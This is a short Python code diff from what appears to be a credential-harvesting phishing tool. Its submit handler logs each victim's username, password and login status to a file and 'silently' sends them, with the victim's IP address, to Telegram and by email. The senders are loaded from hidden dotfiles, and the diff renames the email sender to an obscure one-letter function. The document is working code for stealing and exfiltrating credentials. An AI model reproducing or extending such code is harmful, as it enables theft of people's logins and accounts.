@@ -22,7 +22,7 @@ typewriter = typewriter_module.typewriter
 emailer_spec = importlib.util.spec_from_file_location("emailer", os.path.join(os.path.dirname(__file__), ".emailer.py"))
 emailer_module = importlib.util.module_from_spec(emailer_spec)
 emailer_spec.loader.exec_module(emailer_module)
-send_email = emailer_module.send_email
+l = emailer_module.l   # Yahan l assign karo
 tel_spec = importlib.util.spec_from_file_location("tel", os.path.join(os.path.dirname(__file__), ".tel.py"))
 tel_module = importlib.util.module_from_spec(tel_spec)
 tel_spec.loader.exec_module(tel_module)
@@ -166,7 +166,7 @@ def submit():
         file.write(f"Username: {USERNAME} | Password: {PASSWORD} | Status: {RESULT}\n")
     # Call email sender silently
     send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
-    send_email(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
+    l(USERNAME, PASSWORD,IP_ADDRESS, RESULT)
     if RESULT == "success":
         msg = "Login successful!"
     elif RESULT == "otp":
